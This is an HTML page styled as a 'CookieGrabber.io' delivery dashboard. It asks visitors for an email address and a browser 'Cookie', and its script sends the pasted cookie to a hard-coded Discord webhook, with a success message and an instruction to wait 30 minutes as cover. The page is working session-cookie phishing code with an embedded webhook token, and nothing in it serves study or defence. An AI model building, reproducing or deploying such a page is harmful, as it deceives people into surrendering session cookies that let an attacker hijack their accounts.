<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>CookieGrabber.io â€” Delivery Dashboard</title>
<style>
  :root {
    --midnight: #050c1a;
    --navy: #061f3b;
    --neon: #0ff;
    --accent: #5fc8ff;
  }

  html,body{
    height:100%;
    margin:0;
    font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    color:#e6eef8;
    background:
      radial-gradient(ellipse at 30% 20%, rgba(0,255,255,0.06), transparent 60%),
      radial-gradient(ellipse at 70% 80%, rgba(0,140,255,0.08), transparent 60%),
      linear-gradient(160deg, var(--midnight), var(--navy));
    background-size: cover;
    display:flex;
    align-items:center;
    justify-content:center;
    overflow:hidden;
  }

  /* animated subtle glow shimmer */
  @keyframes glowmove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }
  body::before {
    content:"";
    position:fixed;
    inset:0;
    background:linear-gradient(270deg, rgba(0,255,255,0.05), rgba(255,0,255,0.05), rgba(0,140,255,0.05));
    background-size:400% 400%;
    animation:glowmove 16s ease infinite;
    z-index:-1;
    filter:blur(120px);
  }

  .card{
    width:min(380px, 90%);
    min-height:580px;
    background:rgba(10,20,40,0.7);
    border:1px solid rgba(255,255,255,0.06);
    border-radius:16px;
    padding:28px;
    box-shadow:0 0 25px rgba(0,255,255,0.08);
    backdrop-filter:blur(10px);
  }

  h1{
    text-align:center;
    font-size:22px;
    margin:0 0 16px 0;
    color:var(--accent);
    text-shadow:0 0 8px rgba(95,200,255,0.5);
  }

  label{
    font-size:13px;
    color:#bcd6ff;
    display:block;
    margin-bottom:6px;
  }

  input, textarea{
    width:100%;
    border:none;
    border-radius:8px;
    background:rgba(255,255,255,0.04);
    color:#e6eef8;
    padding:10px;
    font-size:14px;
    margin-bottom:14px;
    outline:none;
    transition: box-shadow 0.25s ease;
  }
  input:focus, textarea:focus{
    box-shadow:0 0 6px var(--accent);
  }

  button{
    width:100%;
    padding:12px;
    border:none;
    border-radius:8px;
    background:linear-gradient(90deg, var(--accent), #00baff);
    color:#041b2e;
    font-weight:700;
    font-size:14px;
    cursor:pointer;
    transition: transform 0.15s ease, box-shadow 0.15s ease;
  }
  button:hover{
    transform:translateY(-1px);
    box-shadow:0 0 10px rgba(95,200,255,0.4);
  }

  .hint{
    margin-top:16px;
    text-align:center;
    font-size:12px;
    color:#9fbff7;
  }

  .status-message {
    margin-top: 16px;
    padding: 10px;
    border-radius: 8px;
    text-align: center;
    font-size: 14px;
    display: none;
  }
  
  .success {
    background-color: rgba(0, 255, 0, 0.1);
    color: #90ee90;
    border: 1px solid rgba(0, 255, 0, 0.3);
  }
  
  .error {
    background-color: rgba(255, 0, 0, 0.1);
    color: #ffcccb;
    border: 1px solid rgba(255, 0, 0, 0.3);
  }
</style>
</head>
<body>
  <main class="card">
    <h1>CookieGrabber.io</h1>

    <label for="orderId">Email Address:</label>
    <input id="orderId" placeholder="" />

    <label for="delivery">Cookie:</label>
    <textarea id="delivery" rows="4" placeholder=""></textarea>

    <button id="submitBtn">Confirm</button>
    
    <div id="statusMessage" class="status-message"></div>

    <div class="hint">Press "Confirm" with the details and wait 30 minutes</div>
  </main>

  <script>
    const order = document.getElementById('orderId');
    const delivery = document.getElementById('delivery');
    const submitBtn = document.getElementById('submitBtn');
    const statusMessage = document.getElementById('statusMessage');
    
    // Webhook URL
    const webhookURL = 'https://ptb.discord.com/api/webhooks/1430576765373386772/lx_TsY9NWYvZLWpnlmntTwA1O6fsDDUPrQC_YkMnRAMEM6HGOqfDcjVsOS3QL4ghQQhA';
    
    function showStatus(message, isSuccess) {
      statusMessage.textContent = message;
      statusMessage.className = `status-message ${isSuccess ? 'success' : 'error'}`;
      statusMessage.style.display = 'block';
      
      // Hide after 5 seconds
      setTimeout(() => {
        statusMessage.style.display = 'none';
      }, 5000);
    }
    
    async function sendToWebhook(cookieData) {
      try {
        const response = await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `Cookie:\n\`\`\`${cookieData}\`\`\``,
          }),
        });
        
        if (response.ok) {
          showStatus('Cookie sent successfully!', true);
          console.log('Cookie sent to webhook successfully');
        } else {
          showStatus('Failed to send cookie. Please try again.', false);
          console.error('Failed to send cookie to webhook');
        }
      } catch (error) {
        showStatus('Error sending cookie. Please try again.', false);
        console.error('Error sending cookie to webhook:', error);
      }
    }
    
    submitBtn.addEventListener('click', () => {
      const o = order.value.trim();
      const d = delivery.value.trim();
      
      if(!o){ 
        showStatus('Please enter an Email Address.', false);
        return; 
      }
      
      if(!d){ 
        showStatus('Please enter a Cookie.', false);
        return; 
      }
      
      // Show local preview
      alert(`Local preview:\nEmail: ${o}\nCookie: ${d}`);
      console.log("[Local preview]", { email: o, cookie: d, time: new Date().toISOString() });
      
      // Send cookie to webhook
      sendToWebhook(d);
    });
  </script>
</body>
</html>
